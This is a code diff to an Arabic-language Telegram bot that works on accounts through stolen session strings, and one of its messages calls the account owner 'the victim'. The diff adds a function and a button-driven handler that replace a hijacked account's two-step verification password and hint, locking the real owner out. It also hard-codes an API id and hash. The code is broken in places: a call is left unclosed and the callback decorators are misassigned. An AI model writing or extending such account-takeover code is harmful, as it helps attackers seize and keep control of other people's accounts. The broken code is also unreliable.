@@ -48,7 +48,28 @@ async def change_number(strses, number):
     ))
     return str(result)
 
-
+# إضافة دالة لتغيير رمز التحقق بخطوتين
+async def change_2fa_password(strses, new_password, hint=""):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            # الحصول على معلومات التحقق بخطوتين
+            result = await X(functions.account.GetPasswordRequest())
+            if result.has_password:
+                # تغيير رمز التحقق بخطوتين
+                await X(functions.account.UpdatePasswordSettingsRequest(
+                    password=result.current_password_hash,
+                    new_settings=types.account.PasswordInputSettings(
+                        new_algo=result.current_algo,
+                        new_password_hash=new_password,
+                        hint=hint
+                    )
+                ))
+                return True, "تم تغيير رمز التحقق بخطوتين بنجاح."
+            else:
+                return False, "التحقق بخطوتين غير مفعل."
+        except Exception as e:
+            return False, f"حدث خطأ: {str(e)}"
+          
 async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
@@ -220,6 +241,7 @@ keyboard = [
     Button.inline("L", data="L"),
     Button.inline("M", data="M"),
     Button.inline("N", data="N"),
+    Button.inline("O", data="O"),
     ],
   [
     Button.url("༺ sourCe kαᖇαᖇ ༻", "https://t.me/aqhvv")
@@ -277,6 +299,7 @@ async def start(event):
             Button.inline("L", data="L"),
             Button.inline("M", data="M"),
             Button.inline("N", data="N"),
+            Button.inline("O", data="O"),
             ],
           [
             Button.url("المـطور", "https://t.me/Lx5x5")
@@ -503,9 +526,31 @@ async def users(event):
       except Exception as e:
         await event.respond(f"قم بتوجيه الرسالة في مجموعة المساعدة الخاصة بالقسم المدفوع \n str(e)")
 
-
-
+# إضافة حدث لمعالجة الضغط على الزر "O"
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+        
+        # طلب إدخال الرمز الجديد للتحقق بخطوتين
+        await x.send_message("الرجاء إدخال الرمز الجديد للتحقق بخطوتين:")
+        new_password = await x.get_response()
+        
+        # طلب إدخال تلميح (اختياري)
+        await x.send_message("الرجاء إدخال تلميح للرمز الجديد (اختياري):")
+        hint = await x.get_response()
+        
+        # استدعاء دالة تغيير رمز التحقق بخطوتين
+        success, message = await change_2fa_password(strses.text, new_password.text, hint.text)
+        await event.reply(message, buttons=keyboard
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
 async def start(event):
     keyboard = [
       [  
